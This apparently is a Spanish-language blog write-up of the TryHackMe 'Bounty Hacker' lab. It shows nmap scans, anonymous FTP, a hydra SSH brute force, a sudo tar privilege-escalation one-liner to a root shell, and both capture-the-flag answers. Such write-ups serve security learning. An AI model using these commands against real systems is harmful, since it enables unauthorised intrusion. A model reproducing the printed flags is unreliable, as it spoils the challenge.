---
layout: single
title: Bounty Hacker - TryHackMe
excerpt: " TryHackMe’s Bounty Hacker room is an easy room that involves FTP, bruteforcing, SSH, and privilege escalation to go from a scan to root. "
date: 2022-08-30
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-bountyhacker/bountyhacker.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - ftp
  - ssh
  - tar
---

TryHackMe’s Bounty Hacker room is an easy room that involves FTP, bruteforcing, SSH, and privilege escalation to go from a scan to root.

# Summary
- IP: 10.10.1.131
- Ports: 21,22,80
- OS: Linux (Ubuntu Xenial)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
	-  80 -> Apache httpd 2.4.18

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.1.131 -oG allPorts
```


- Escaneo profundo de puertos:

```bash
$sudo nmap -p21,22,80 -sCV 10.10.1.131 -oN targeted
```


- Escaneo de página web:

```bash
$sudo nmap --script http-enum -p80 10.10.1.131 -oN webScan
```


- Podemos acceder via FTP como anonymous, encontramos dos archivos:

```bash
$ftp 10.10.1.131
```


- Un archivo contiene lo que parece ser un diccionario; analizamos la página web, pero no encontramos nada relevante.
- Con la información actual, hacemos un ataque de fuerza bruta con hydra para intentar logearnos como usuario "lin" (nombre encontrado en los recursos anteriormente enumerados) utilizando el diccionario descargado por ftp:

```bash
$hydra -l lin -P /home/dante/Tryhackme/Bounty_Hacker/content/locks.txt ssh://10.10.1.131
```

- Encontramos una credencial, accedemos a la máquina como lin:

```bash
$ssh lin@10.10.1.131
```


- Leemos la primera flag:
# USER FLAG: THM{CR1M3_SyNd1C4T3}

# ESCALANDO PRIVILEGIOS:

-  Buscamos binarios permitidos ejecutar como sudoer:

```bash
$sudo -l
```


- Podemos ejecutar el binario "tar", con una búsqueda en gtfobins encontramos la siguiente forma de escalar privilegios:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Leemos la flag de root:

# ROOT FLAG: THM{80UN7Y_h4cK3r}
